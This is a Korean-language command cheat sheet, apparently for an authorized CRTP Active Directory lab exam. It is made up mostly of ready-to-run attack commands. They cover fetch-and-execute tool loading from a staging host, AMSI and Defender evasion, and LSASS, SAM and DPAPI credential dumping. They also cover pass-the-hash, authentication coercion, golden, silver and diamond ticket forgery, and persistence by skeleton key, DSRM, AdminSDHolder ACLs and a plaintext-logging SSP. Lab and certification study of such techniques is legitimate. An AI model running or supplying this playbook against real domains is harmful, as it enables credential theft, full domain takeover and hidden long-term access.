# 실행 치트시트 (HOW) — 인가된 CRTP 랩 전용

findings(evidence_plan)가 **무엇을 공격할지**를 데이터로 짚어주면, 이 파일은 그 각 단계를
**어떻게 실제로 실행하는지**의 정형 명령이다. 환경 무관(제너릭) — `<...>`만 상황값으로 교체.

> ⚠️ 규정: 명령·출력은 증거(📸)로, **"왜/무엇을"의 서술은 본인 문장**으로. 포트 **4444/8888**만.
> 📸 원칙: 모든 전환마다 같은 창에 `whoami` + 명령 + 출력.

---

## 0. 도구 로딩 / AMSI 우회 (in-memory, 디스크 최소화)
```powershell
# 8888 = 스테이징(HTTP), 4444 = 셸
IEX (New-Object Net.WebClient).DownloadString('http://<studvm>:8888/PowerView.ps1')
# AMSI 막히면: 세션에 우회 1줄 먼저 (난독화본 준비해둘 것)
# .NET 어셈블리 in-memory 로드
[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://<studvm>:8888/Rubeus.exe'))
# InviShell: 콘솔 로깅/AMSI 회피 쉘 (배치 내용 붙여넣기)
```
📸 로드 성공 + 현재 identity. 🖊 왜 in-memory/우회를 썼는지.

## 1. 자격 추출 (Credential Access)
```powershell
# (A) LSASS 메모리 — 로컬 관리자/SYSTEM 필요
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'          # AES 키 (OPTH용)
SafetyKatz.exe "sekurlsa::logonpasswords" "exit"

# (B) LSASS 덤프 후 오프라인 (AV 회피 유리)
rundll32 C:\windows\system32\comsvcs.dll MiniDump <lsass_pid> C:\temp\l.dmp full
#   -> studvm: mimikatz "sekurlsa::minidump l.dmp" "sekurlsa::logonpasswords"

# (C) SAM/SYSTEM 하이브 — SeBackup 권한 또는 로컬관리자
reg save hklm\sam  C:\temp\sam.hiv
reg save hklm\system C:\temp\system.hiv
#   -> studvm: secretsdump.py -sam sam.hiv -system system.hiv LOCAL

# (D) 저장 자격 / GPP / DPAPI
cmdkey /list
findstr /S cpassword \\<domain>\SYSVOL\*.xml          # GPP cpassword
Invoke-Mimikatz -Command '"sekurlsa::dpapi"'
```
📸 덤프 명령 + 획득한 해시/평문 화면(+whoami). 🖊 어떤 자격을 왜 노렸는지.

## 2. 측면 이동 (Lateral Movement)
```powershell
# OverPass-the-Hash (NTLM/AES -> TGT)
Rubeus.exe asktgt /user:<u> /rc4:<ntlm> /ptt
Rubeus.exe asktgt /user:<u> /aes256:<aeskey> /ptt      # AES가 더 조용함
# Pass-the-Hash (직접)
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<u> /domain:<d> /ntlm:<hash> /run:cmd"'
# 원격 실행
winrs -r:<host> cmd
Invoke-Command -ComputerName <host> -ScriptBlock { hostname; whoami }
Enter-PSSession -ComputerName <host>
```
📸 티켓 주입(klist) + 대상에서 `hostname; whoami`(내 접근을 통해). 🖊 어떤 자격으로 어디로 이동.

## 3. 강제 인증 (Coercion) — 무제약/릴레이 전제
```powershell
# 먼저 수신: Rubeus.exe monitor /interval:5 /nowrap   (무제약 호스트에서)
PetitPotam.exe <attacker_listener> <target_dc>         # MS-EFSRPC
SpoolSample.exe <target_dc> <attacker_listener>        # MS-RPRN (Printer Bug)
# MS-RPRN 막히면 대안:
Invoke-DFSCoerce / DFSCoerce.exe <listener> <target_dc>   # MS-DFSNM
```
📸 캡처된 DC TGT. 🖊 어떤 coercion으로 무엇을 끌어냈는지.

## 4. 인증서 인증 (AD CS 악용 뒤 — adcs.py가 ESC 짚어줌)
```powershell
# 발급받은 pfx로 TGT (PKINIT)
Rubeus.exe asktgt /user:<priv_user> /certificate:<cert.pfx> /password:<pw> /domain:<d> /dc:<dc> /ptt
# PKINIT이 막히고 NTLM만 필요하면 U2U로 NT 해시 복구
Rubeus.exe asktgt /user:<u> /certificate:<pfx> /password:<pw> /getcredentials /show
#   -> 나온 NT 해시로 PtH/OPTH
```
📸 asktgt 성공 + klist + 대상 접근. 🖊 왜 PKINIT/U2U를 썼는지.

## 5. 티켓 위조 (Domain Persistence / 교차도메인)
```powershell
# Golden (krbtgt 해시 필요 — DCSync로 획득)  ※ detect_trusts/dcsync가 값 채워줌
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<d> /sid:<dsid> /krbtgt:<hash> /ptt"'
# Child->Parent: /sids:<parent_EA_sid> 추가 (SID filtering OFF일 때 — findings가 명시)
# Silver (서비스 계정 해시로 특정 서비스 티켓)
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<d> /sid:<dsid> /target:<host> /service:cifs /rc4:<svc_hash> /ptt"'
# Trust key (child->parent inter-realm)
Invoke-Mimikatz -Command '"lsadump::trust /patch"'      # 트러스트 키 확인
Rubeus.exe asktgt /user:<child$> /rc4:<trust_key> /domain:<child> /ptt  # inter-realm TGT
```
📸 위조 + klist + 상위 리소스 접근. 🖊 경로 요약(본인 문장).

## 6. 플래그
```powershell
hostname; whoami
type C:\Users\finadmin\Desktop\finalflag.txt
```
📸 **hostname + whoami + flag 한 화면** (필수).

---

## 7. 지속성 (Persistence) — DA/krbtgt 확보 후, 보고서 "지속성" 섹션용
> 전제: 이미 DA 또는 DCSync로 krbtgt/서비스 해시 확보. flag엔 불필요하지만 보고서 깊이에 가점.
```powershell
# Golden/Silver = 위 5번 참조.

# Diamond Ticket (정식 TGT를 수정 — Golden보다 은밀, krbtgt AES 필요)
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:<krbtgt_aes256> /nowrap /ptt

# Skeleton Key (DC LSASS 패치 → 모든 계정이 마스터 PW로 인증; DC에 DA 필요)
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <dc>
#   이후 어떤 계정이든 패스워드 "mimikatz" 로 인증

# DSRM (DC 로컬 관리자 해시 → PtH; DC에 DA 필요)
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'   # DSRM(Administrator) 해시 덤프
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD -Force
#   이후 그 해시로 <dc>\Administrator PtH (네트워크 로그온)

# AdminSDHolder (ACL 지속성 — SDProp가 보호그룹 전체에 전파)
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,<DN>' -PrincipalIdentity <you> -Rights All
#   SDProp(기본 60분) 후 DA/EA 등에 GenericAll 획득

# Custom SSP (평문 자격 로깅 — in-memory)
Invoke-Mimikatz -Command '"misc::memssp"'    # -> C:\Windows\System32\mimilsa.log 에 평문
```
📸 설치/위조 + 재인증으로 지속 접근 입증. 🖊 각 기법의 원리·탐지·완화는 본인 문장.

## Defender / AMSI 운영 메모
- 시그니처 걸리는 바이너리(mimikatz 등)는 **in-memory 로드 / 리네임 / 난독화본** 사용.
- 예약작업으로 Defender 실시간 보호 일시 비활성(관리자 필요) 후 덤프 — 실제 보고서에서도 쓴 패턴.
- 항상 **되는 것부터, 한 번에 한 수.** 실패하면 그 자체가 보고서 STEP(가점).

> 깊은 변형/최신 우회는 `ad-internal-pentest` 스킬 기법 인덱스 참조.
